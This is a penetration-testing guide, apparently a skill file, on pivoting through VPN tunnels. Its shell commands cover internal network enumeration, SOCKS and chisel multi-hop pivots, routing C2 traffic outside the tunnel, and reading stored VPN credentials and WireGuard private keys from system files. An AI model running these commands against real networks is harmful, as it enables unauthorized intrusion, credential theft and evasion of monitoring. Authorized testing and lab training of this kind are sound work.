# VPN Pivoting and Lateral Movement Guide

> Techniques for using VPN tunnels as pivoting infrastructure during penetration testing engagements. Covers establishing VPN-based pivots, chaining VPN connections for deep network traversal, exploiting split tunneling for dual-path C2, and maintaining operational security through VPN-based lateral movement.

## Introduction

Once a VPN connection is established during a penetration test, whether through compromised credentials, session hijacking, or authorized testing access, the VPN tunnel becomes a powerful pivoting platform. VPN tunnels provide encrypted Layer 2 or Layer 3 connectivity to internal networks, often bypassing network segmentation controls that would otherwise limit lateral movement.

This guide covers the techniques for maximizing the utility of a VPN connection during penetration testing, from basic internal network enumeration through the VPN to advanced multi-hop pivoting chains that combine VPN tunnels with other tunneling technologies for deep network traversal.

**Objectives**: Enumerate internal networks through VPN tunnels, establish VPN-based pivoting infrastructure, chain VPN connections with other tunneling tools, and maintain operational security during lateral movement.

**Prerequisites**: Active VPN connection (IPSec, SSL VPN, OpenVPN, or WireGuard). Understanding of IP routing and network segmentation concepts. Familiarity with the network-tunneling-proxy skill for additional tunneling tools.

---

## 1. Internal Network Enumeration Through VPN

### Network Discovery

Once connected to a VPN, the first step is enumerating the accessible internal network. The VPN-assigned IP address and subnet mask reveal the immediate network segment, but routing tables and DNS configuration often provide broader visibility.

```bash
# Identify VPN-assigned interface and IP address
ip addr show | grep -A5 "tun\|ppp\|tap"
# Output example:
# 3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500
#     inet 10.8.0.50/24 brd 10.8.0.255 scope global tun0

# Check routing table for VPN-pushed routes
ip route show | grep -E "tun|ppp|tap"
# These routes show which internal subnets the VPN provides access to

# Examine DNS configuration pushed by VPN
cat /etc/resolv.conf
# Look for internal domain names and DNS server addresses
# Internal DNS servers reveal the location of DNS infrastructure

# Enumerate DNS search domains for target identification
grep "search" /etc/resolv.conf
# Example: search corp.internal prod.internal dev.corp.internal
# Each domain may correspond to a different internal network segment
```

### Subnet Scanning Through VPN

```bash
# Quick host discovery across common internal subnets
# Start with the VPN-assigned subnet
VPN_SUBNET=$(ip route | grep tun0 | grep -v default | awk '{print $1}' | head -1)
echo "VPN subnet: $VPN_SUBNET"
nmap -sn $VPN_SUBNET -oG vpn_subnet_hosts.txt | grep "Up"

# Expand to common internal network ranges
for subnet in 10.0.0.0/24 10.0.1.0/24 10.10.0.0/24 10.10.10.0/24 \
              172.16.0.0/24 172.16.1.0/24 192.168.0.0/24 192.168.1.0/24 \
              192.168.100.0/24 192.168.200.0/24; do
  live=$(nmap -sn $subnet --max-retries 1 --max-rtt-timeout 500ms 2>/dev/null | grep "Up" | wc -l)
  [ "$live" -gt 0 ] && echo "$subnet: $live hosts alive"
done

# DNS-based host enumeration using internal DNS server
DNS_SERVER=$(grep nameserver /etc/resolv.conf | head -1 | awk '{print $2}')
for name in web mail ftp db app api admin vpn gw router switch dc ad exchange sharepoint wiki git jenkins; do
  for domain in $(grep search /etc/resolv.conf | sed 's/search //'); do
    ip=$(dig +short $name.$domain @$DNS_SERVER 2>/dev/null)
    [ -n "$ip" ] && echo "$name.$domain -> $ip"
  done
done
```

### Service Identification Through VPN

```bash
# Targeted port scanning of discovered hosts for common internal services
# Focus on high-value services: databases, management interfaces, file shares
nmap -sT -Pn --top-ports 100 --open -iL live_hosts.txt -oA vpn_scan_results

# Quick check for high-value targets
nmap -sT -Pn -p 22,80,443,3389,3306,5432,1433,27017,8080,8443,9200,6379 \
  -iL live_hosts.txt --open -oA vpn_service_scan

# SMB enumeration (Windows environments)
nmap -sT -Pn -p 445 --script=smb-enum-shares,smb-enum-users -iL live_hosts.txt

# SNMP enumeration (network infrastructure)
nmap -sU -p 161 --script=snmp-info -iL live_hosts.txt
```

---

## 2. VPN as a Pivoting Platform

### SOCKS Proxy Through VPN

Setting up a SOCKS proxy through the VPN connection allows routing arbitrary application traffic through the VPN tunnel without configuring each tool individually.

```bash
# Option 1: SSH SOCKS proxy through VPN-connected host
# If the VPN provides access to an internal SSH server:
ssh -D 1080 -fN -o ServerAliveInterval=60 internal-user@10.0.0.5
# Route tools through the SOCKS proxy:
# proxychains4 nmap -sT -Pn 10.10.10.0/24

# Option 2: chisel SOCKS proxy through VPN
# On the VPN-accessible internal host:
chisel server -p 8080 --socks5 --reverse

# From the VPN-connected machine:
chisel client http://10.0.0.5:8080 R:socks
# Creates a SOCKS proxy on localhost:1080 routing through the VPN host

# Option 3: sshuttle for transparent VPN-through-VPN routing
# If SSH access is available on a VPN-accessible host:
sshuttle -r internal-user@10.0.0.5 10.10.0.0/16 --dns
# Routes all 10.10.0.0/16 traffic through the internal SSH host via VPN
```

### Multi-Hop Pivoting Through VPN

For reaching deeply nested network segments, chain the VPN connection with additional pivoting tools.

```bash
# Scenario: VPN -> DMZ Host -> Internal Network -> Database Tier
# Hop 1: VPN tunnel provides access to 10.0.0.0/24 (DMZ)
# Already connected via VPN (tun0 interface)

# Hop 2: SSH SOCKS proxy to internal-facing DMZ host
ssh -D 1081 -fN dmz-user@10.0.0.10

# Hop 3: Through the SOCKS proxy, deploy chisel to internal host
proxychains4 scp chisel internal-user@10.10.0.5:/tmp/chisel

# Hop 4: Start chisel on the internal host, connecting back through SOCKS
proxychains4 ssh internal-user@10.10.0.5 "/tmp/chisel client http://10.0.0.10:8081 R:socks &"

# Hop 5: Configure proxychains for multi-hop routing
cat > /etc/proxychains4.conf << 'EOF'
dynamic_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1081
socks5 127.0.0.1 1080
EOF

# Now route traffic to database tier through the complete chain
proxychains4 nmap -sT -Pn 192.168.50.0/24 --top-ports 20
```

---

## 3. Split Tunneling Exploitation

### Dual-Path C2 Communication

When split tunneling is enabled on the VPN, the attacker can use the Internet-facing connection for C2 communication while using the VPN tunnel exclusively for internal network access. This separation prevents C2 traffic from appearing in VPN session logs.

```bash
# Identify the direct Internet interface (non-VPN)
DIRECT_IFACE=$(ip route | grep default | grep -v tun | awk '{print $5}' | head -1)
VPN_IFACE=$(ip route | grep -E "tun|ppp" | grep -v default | awk '{print $5}' | head -1)

echo "Direct Internet: $DIRECT_IFACE"
echo "VPN interface: $VPN_IFACE"

# Route C2 traffic through direct Internet interface
ip route add <c2_server_ip>/32 dev $DIRECT_IFACE

# Route internal targets through VPN interface
ip route add 10.0.0.0/8 dev $VPN_IFACE
ip route add 172.16.0.0/12 dev $VPN_IFACE
ip route add 192.168.0.0/16 dev $VPN_IFACE

# Verify routing
ip route get <c2_server_ip>    # Should go through direct interface
ip route get 10.0.0.1          # Should go through VPN interface
```

### DNS Leak Exploitation

DNS queries that bypass the VPN tunnel can reveal internal domain names and infrastructure details to external DNS resolvers.

```bash
# Verify DNS is split-tunneled (queries go to external resolver)
tcpdump -i $DIRECT_IFACE port 53 -c 5 &
# Generate DNS queries for internal resources
nslookup internal-api.corp.local 2>/dev/null
nslookup db-server.corp.local 2>/dev/null
nslookup dc01.corp.local 2>/dev/null

# Capture shows internal hostnames leaked to external DNS
# This reveals internal naming conventions and service locations
```

---

## 4. VPN Session Persistence

### Session Maintenance Techniques

Maintaining persistent access through a VPN connection requires handling session timeouts, reconnection, and credential rotation.

```bash
# Keep-alive script to prevent idle timeout
cat > vpn_keepalive.sh << 'SCRIPT'
#!/bin/bash
# Send periodic traffic through VPN to prevent idle disconnect
VPN_GW=$(ip route | grep tun | grep -v default | awk '{print $3}' | head -1)
while true; do
  ping -c 1 -W 5 $VPN_GW >/dev/null 2>&1
  sleep 120  # Ping every 2 minutes
done
SCRIPT
chmod +x vpn_keepalive.sh

# Auto-reconnection wrapper for OpenVPN
cat > vpn_auto_reconnect.sh << 'SCRIPT'
#!/bin/bash
MAX_RETRIES=5
DELAY=30
for i in $(seq 1 $MAX_RETRIES); do
  openvpn --config client.ovpn --auth-user-pass credentials.txt
  echo "Connection lost. Reconnecting in ${DELAY}s... (attempt $i/$MAX_RETRIES)"
  sleep $DELAY
done
SCRIPT
chmod +x vpn_auto_reconnect.sh
```

### Credential Persistence

```bash
# Extract VPN credentials from various sources for persistent access
# OpenVPN saved credentials
cat /etc/openvpn/credentials.txt 2>/dev/null
cat ~/.openvpn/auth.txt 2>/dev/null

# Cisco VPN profiles (decoded PSK)
grep -i "GroupPwd\|enc_GroupPwd" /tmp/*.pcf 2>/dev/null
cisco-decrypt $(grep enc_GroupPwd /tmp/profile.pcf | cut -d= -f2) 2>/dev/null

# NetworkManager VPN connections
sudo cat /etc/NetworkManager/system-connections/*.vpn 2>/dev/null | \
  grep -A2 -i "password\|secret\|psk"

# WireGuard keys
sudo cat /etc/wireguard/*.conf 2>/dev/null | grep -i "privatekey"
```

---

## 5. Operational Security Considerations

### Traffic Pattern Management

```bash
# Rate-limit scanning through VPN to avoid triggering network monitoring
nmap -sT -Pn --max-rate 10 --scan-delay 500ms 10.0.0.0/24

# Schedule intensive operations during business hours
echo "proxychains4 nmap -sT -Pn 10.0.0.0/24 --top-ports 100" | at 10:00

# Randomize target scanning order
nmap -sT -Pn --randomize-hosts 10.0.0.0/24

# Limit concurrent connections
nmap -sT -Pn --max-parallelism 5 10.0.0.0/24
```

### Evidence Collection for Reporting

```bash
# Document VPN configuration at engagement start
ip addr show tun0 > vpn_evidence.txt
ip route show >> vpn_evidence.txt
cat /etc/resolv.conf >> vpn_evidence.txt

# Screenshot VPN connection establishment
import -window root vpn_connected_$(date +%Y%m%d_%H%M%S).png

# Log all activity through VPN with timestamps
script vpn_session_$(date +%Y%m%d_%H%M%S).log

# Capture network state at engagement end
ip route show > vpn_routes_final.txt
nmap -sn 10.0.0.0/24 -oG vpn_hosts_final.txt
```

---

## Hands-on Exercise: VPN-Based Network Traversal

Practice using a VPN connection as a pivoting platform for internal network access.

**Setup**: Establish a VPN connection to a lab network with multiple internal segments. The lab should have at least three network segments: VPN gateway network (10.0.0.0/24), application network (10.10.0.0/24), and database network (192.168.50.0/24).

**Exercise steps**:

1. Enumerate the VPN-assigned network segment and identify live hosts
2. Use DNS through the VPN to discover internal hostnames and services
3. Establish a SOCKS proxy through the VPN for tool routing
4. Scan deeper network segments through the VPN-connected SOCKS proxy
5. Document all discovered services and network segmentation findings
6. Test for split tunneling and document any traffic leakage
7. Practice VPN session persistence techniques with keep-alive scripts

**Validation criteria**: Discover at least 10 hosts across three network segments. Successfully route scanning tools through VPN-based SOCKS proxy. Document the complete network topology accessible through the VPN.

## References

- **network-tunneling-proxy skill** — Additional tunneling and pivoting tools
- **post-exploitation skill** — Lateral movement techniques after VPN access
- **network-pentest skill** — Network reconnaissance methodology
- [MITRE ATT&CK T1021.001 - Remote Services: Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001/)
- [MITRE ATT&CK T1572 - Protocol Tunneling](https://attack.mitre.org/techniques/T1572/)
- [HackTricks - Pivoting](https://book.hacktricks.xyz/generic-methodologies-and-resources/pivoting)
- [PTES - Network Attacks](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)
